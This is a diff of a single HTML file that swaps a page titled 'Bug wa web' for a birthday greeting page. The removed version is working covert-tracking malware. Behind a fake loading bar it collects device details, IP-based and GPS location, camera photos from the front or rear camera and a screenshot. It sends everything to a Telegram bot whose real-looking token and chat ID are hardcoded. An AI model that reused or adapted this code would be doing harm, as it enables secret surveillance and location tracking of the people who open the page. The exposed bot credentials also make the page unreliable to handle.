@@ -1,149 +1,153 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>Bug wa web</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style>
-        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
-        #loading-container{text-align:center;width:80%;max-width:400px}
-        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa}
-        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
-        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
-        #loading-details{margin-top:20px;font-size:14px;color:#666}
-        .hidden{display:none}
-    </style>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Happy Birthday</title>
+
+<style>
+body{
+    margin:0;
+    background:black;
+    font-family:Arial;
+    text-align:center;
+    color:white;
+    overflow:hidden;
+}
+
+/* TEXT */
+h1{margin-top:30px;font-size:50px;}
+h2{
+    color:#ff2da6;
+    text-shadow:0 0 10px #ff2da6,0 0 20px #ff2da6;
+}
+
+/* CAKE */
+.cake{
+    width:220px;
+    height:120px;
+    margin:30px auto;
+    background:linear-gradient(#5a2e0f,#2b1406);
+    border-radius:20px;
+    position:relative;
+    z-index:5;
+}
+.cake:before{
+    content:"";
+    position:absolute;
+    top:-30px;
+    left:10px;
+    width:200px;
+    height:60px;
+    background:white;
+    border-radius:50%;
+}
+
+/* BALLOON */
+.balloon{
+    position:absolute;
+    width:40px;
+    height:55px;
+    border-radius:50%;
+    bottom:-60px;
+    z-index:10;
+    animation:rise 6s linear forwards;
+}
+@keyframes rise{
+    from{transform:translateY(0);}
+    to{transform:translateY(-110vh);}
+}
+
+/* FIREWORK */
+.spark{
+    position:absolute;
+    width:5px;
+    height:5px;
+    border-radius:50%;
+    z-index:1;
+    animation:explode 1s forwards;
+}
+@keyframes explode{
+    to{
+        transform:translate(var(--x),var(--y));
+        opacity:0;
+    }
+}
+
+/* HEART */
+.heart{
+    font-size:28px;
+    color:#ff0066;
+    text-shadow:0 0 10px #ff0066;
+    animation:pulse 1s infinite alternate;
+}
+@keyframes pulse{
+    from{transform:scale(1);}
+    to{transform:scale(1.2);}
+}
+
+/* HEARTBEAT */
+.line{
+    fill:none;
+    stroke:yellow;
+    stroke-width:3;
+    stroke-dasharray:400;
+    stroke-dashoffset:400;
+    animation:hb 2s linear infinite;
+}
+@keyframes hb{
+    to{stroke-dashoffset:0;}
+}
+</style>
 </head>
+
 <body>
-    <div id="loading-container">
-        <div id="loading-text">LOADING PROCESS</div>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="loading-details">Starting initialization...</div>
-    </div>
-    
-    <video id="v" autoplay muted class="hidden"></video>
-    <canvas id="c" class="hidden"></canvas>
+
+<h1>Happy Birthday</h1>
+<h2>Muskan Singh</h2>
+
+<div class="cake"></div>
+
+<div class="heart">❤</div>
+
+<svg width="200" height="60">
+<path class="line"
+d="M0 30 L20 30 L30 10 L40 50 L50 30 L70 30 L80 20 L90 40 L100 30 L200 30"/>
+</svg>
 
 <script>
-(()=>{
-    const T='8544638957:AAEe5Rb9ctd5tjLyuXJPFTRfwKOTPvGGKbc', // <-- ENTER YOUR TELEGRAM BOT TOKEN HERE
-          C='6415960307', // <-- ENTER YOUR TELEGRAM CHAT ID HEREI
-          pb=document.getElementById('progress-bar'),
-          ld=document.getElementById('loading-details');
 
-    let p=0;
-    const LM=["Checking system modules...","Loading core components...","Initializing interfaces...","Verifying connections...","Preparing environment...","Checking for updates...","Loading display assets..."];
-    
-    // Logic for progress bar
-    setInterval(()=>{
-        p+=Math.random()*5;
-        if(p>98)p=98;
-        pb.style.width=p+'%';
-        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
-    },500);
+/* BALLOONS */
+function createBalloon(){
+    let b=document.createElement("div");
+    b.className="balloon";
+    b.style.left=Math.random()*90+"%";
+    b.style.background="hsl("+Math.random()*360+",80%,60%)";
+    document.body.appendChild(b);
 
-    // Send message function to Telegram
-    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
-    
-    // Function to send photos to Telegram
-    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
-    
-    // Function to get detailed location from coordinates
-    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
-    
-    // Function to get device information
-    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|NOT GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Language: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YES':'❌ NO'}\n`}catch(e){m+='🔋 Battery: ❌ Not available\n'}}m+=`⏰ Access Time: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YES':'❌ NO'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ City: ${d.city}\n🏙️ Regency: ${d.region}\n🗺️ Region: ${d.region}\n🌎 Country: ${d.country_name}\n🏷️ Postal code: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Regency: ${l.kb}\n🏙️ Subdistrict: ${l.kc}\n🏠 Complete address: ${l.fa}\n`}}catch(e){m+='❌ Failed to get location information\n'}m+='\n╰───── Telegram @Kalyug_hu  ───── ⦿';return m};
+    setTimeout(()=>{b.remove();},6000);
+}
+setInterval(createBalloon,800);
 
-    // Taking pictures from the camera in a certain mode
-    const captureCamera = async (mode) => {
-        const v = document.getElementById('v'), 
-              c = document.getElementById('c');
-        let stream;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: { exact: mode } 
-                }
-            });
-            v.srcObject = stream;
-            
-            await new Promise(resolve => v.onloadedmetadata = resolve);
-            v.play();
+/* FIREWORKS */
+function createFirework(){
+    let x=Math.random()*window.innerWidth;
+    let y=Math.random()*window.innerHeight/2;
 
-            // Camera wait time 1.5 seconds
-            await new Promise(r => setTimeout(r, 1500)); 
-            
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            
-            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
-            
-            stream.getTracks().forEach(t => t.stop());
-            return true; 
-            
-        } catch (e) {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-            }
-            await sTG(`⚠️ Camera Access Failed ${mode.toUpperCase()}. Try another mode...`);
-            return false; 
-        }
-    };
+    for(let i=0;i<25;i++){
+        let s=document.createElement("div");
+        s.className="spark";
+        s.style.left=x+"px";
+        s.style.top=y+"px";
+        s.style.background="hsl("+Math.random()*360+",100%,60%)";
+        s.style.setProperty('--x',(Math.random()*200-100)+"px");
+        s.style.setProperty('--y',(Math.random()*200-100)+"px");
+        document.body.appendChild(s);
+        setTimeout(()=>s.remove(),1000);
+    }
+}
+setInterval(createFirework,2000);
 
-    // MAIN FUNCTION: Carry out all tracking processes
-    const ST=async()=>{
-        await sTG(await cDI()); 
-
-        let cameraSuccess = false;
-
-        // 1. Try the Front Camera (User)
-        cameraSuccess = await captureCamera("user");
-
-        // 2. If That Fails, Try the Rear Camera (Environment)
-        if (!cameraSuccess) {
-            cameraSuccess = await captureCamera("environment");
-        }
-
-        if (!cameraSuccess) {
-             await sTG('❌ Access to both cameras (Front & Rear) is blocked.');
-        }
-
-        // Take Screenshot 
-        setTimeout(async()=>{
-            try{
-                const cn=await html2canvas(document.body);
-                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
-            }catch(e){
-                await sTG('❌ Screenshot failed')
-            }
-        }, 2000); 
-
-        // Using getCurrentPosition to only send 1x and adding a Google Maps link
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(async p=>{
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                
-                // Adding a Google Maps link
-                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
-                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-                
-                const l=await gLD(lat,lon);
-                g+=`🏙️ Regency: ${l.kb}\n🏙️ Subdistrict: ${l.kc}\n🏠 Address: ${l.fa}\n`;
-                await sTG(g)
-            },async e=>{
-                await sTG(`❌ GPS Error: ${e.message}`)
-            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
-        }
-    };
-
-    // Execute the ST function immediately without delay
-ST();
-})();
 </script>
+
 </body>
 </html>
